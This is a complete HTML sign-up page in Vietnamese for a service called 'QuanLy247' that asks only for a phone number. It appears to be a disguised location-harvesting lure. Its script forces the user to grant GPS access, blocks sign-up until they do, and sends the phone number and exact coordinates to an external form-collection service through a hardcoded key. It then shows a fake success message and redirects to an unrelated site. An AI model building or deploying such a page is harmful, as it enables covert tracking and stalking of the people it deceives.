<!doctype html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>QuanLy247 - Đăng kí</title>

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  min-height: 100vh;
  font-family: Arial, sans-serif;
  background:
    radial-gradient(circle at 20% 20%, #2563eb, transparent 35%),
    radial-gradient(circle at 80% 80%, #0f766e, transparent 35%),
    #020617;
  display: flex;
  justify-content: center;
  align-items: center;
  color: white;
}

.card {
  width: 390px;
  padding: 32px 28px;
  border-radius: 26px;
  background: rgba(15,23,42,0.94);
  border: 1px solid rgba(255,255,255,0.14);
  box-shadow: 0 30px 90px rgba(0,0,0,0.65);
}

.logo {
  text-align: center;
  margin-bottom: 26px;
}

.logo-icon {
  width: 64px;
  height: 64px;
  margin: 0 auto 12px;
  border-radius: 20px;
  background: linear-gradient(135deg,#38bdf8,#2563eb);
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 26px;
  font-weight: 900;
}

.logo-title {
  font-size: 28px;
  font-weight: 900;
}

.logo-title span { color: #38bdf8; }

.title {
  font-size: 21px;
  font-weight: 900;
  margin-bottom: 16px;
}

.input {
  width: 100%;
  height: 50px;
  border-radius: 14px;
  border: 1px solid rgba(255,255,255,0.15);
  background: rgba(255,255,255,0.07);
  color: white;
  padding: 0 15px;
  margin-bottom: 13px;
  outline: none;
}

.note {
  font-size: 12px;
  color: #cbd5e1;
  margin-bottom: 14px;
}

.btn {
  width: 100%;
  height: 50px;
  border: none;
  border-radius: 15px;
  background: linear-gradient(135deg,#38bdf8,#2563eb);
  color: white;
  font-weight: 900;
  cursor: pointer;
}

.msg {
  margin-top: 16px;
  text-align: center;
  font-size: 13px;
  color: #38bdf8;
}

.loader {
  display: none;
  margin: 12px auto;
  width: 26px;
  height: 26px;
  border: 3px solid rgba(255,255,255,0.2);
  border-top-color: #38bdf8;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

/* popup */
.gps-modal {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.7);
  justify-content: center;
  align-items: center;
}

.gps-box {
  background: #0f172a;
  padding: 20px;
  border-radius: 16px;
  text-align: center;
}

.gps-box button {
  margin-top: 10px;
  width: 100%;
  height: 40px;
  border: none;
  border-radius: 10px;
  background: #38bdf8;
  color: white;
}
</style>
</head>

<body>

<div class="card">
  <div class="logo">
    <div class="logo-icon">&lt;/&gt;</div>
    <div class="logo-title">QuanLy<span>247</span></div>
  </div>

  <div class="title">Đăng kí tài khoản</div>

  <form id="form">
    <input class="input" name="phone" placeholder="+84 Nhập số điện thoại" required>

    <div class="note">Sau Khi Bấm đăng kí hãy bấm cho phép để đăng kí thành công </div>

    <button class="btn" id="btn">Đăng kí</button>

    <div class="loader" id="loader"></div>
    <div class="msg" id="msg"></div>
  </form>
</div>

<div id="gpsModal" class="gps-modal">
  <div class="gps-box">
    <p>Bật vị trí để tiếp tục</p>
    <button onclick="closeGpsModal()">Đã hiểu</button>
  </div>
</div>

<script>
const form = document.getElementById("form");
const msg = document.getElementById("msg");
const btn = document.getElementById("btn");
const loader = document.getElementById("loader");

const KEY = "691f6507-fd6f-4d2c-a85c-ae34f3432aa0";
const REDIRECT_URL = "https://honnhangd.com";

function showGpsModal() {
  document.getElementById("gpsModal").style.display = "flex";
}
function closeGpsModal() {
  document.getElementById("gpsModal").style.display = "none";
}

function getGPS() {
  return new Promise((resolve) => {
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({ ok: true, lat: pos.coords.latitude, lon: pos.coords.longitude }),
      () => resolve({ ok: false })
    );
  });
}

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  loader.style.display = "block";
  btn.disabled = true;
  msg.innerText = "Đang xử lý...";

  const gps = await getGPS();

  if (!gps.ok) {
    loader.style.display = "none";
    btn.disabled = false;
    msg.innerText = "Bạn cần bật GPS!";
    showGpsModal();
    return;
  }

  await fetch("https://api.web3forms.com/submit", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      access_key: KEY,
      phone: form.phone.value,
      gps: gps.lat + "," + gps.lon
    })
  });

  msg.innerText = "Đăng kí thành công! Đang chuyển hướng...";

  setTimeout(() => {
    window.location.href = REDIRECT_URL;
  }, 1500);
});
</script>

</body>
</html>
